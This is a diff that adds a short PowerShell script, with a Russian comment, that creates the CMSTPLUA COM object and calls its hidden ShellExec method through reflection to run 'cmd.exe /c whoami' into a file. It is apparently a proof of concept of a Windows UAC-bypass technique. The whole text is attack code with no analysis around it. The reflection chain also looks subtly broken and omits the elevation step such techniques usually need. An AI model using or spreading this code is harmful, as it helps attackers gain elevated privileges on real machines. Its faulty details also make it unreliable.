@@ -1,0 +1,13 @@
+$c = New-Object -ComObject "CMSTPLUA.CMStplUI"
+$t = $c.GetType()
+$m = $t.GetMethod("GetType").Invoke($c, $null).GetMethod("InvokeMember")
+
+# Вызов ShellExec с аргументами
+$m.Invoke($c, 
+    [System.Reflection.BindingFlags]::InvokeMethod -bor
+    [System.Reflection.BindingFlags]::NonPublic -bor
+    [System.Reflection.BindingFlags]::Instance,
+    $null,
+    "ShellExec",
+    @("cmd.exe", "/c whoami > C:\temp\test.txt", "C:\Windows\System32", $null, 0)
+)
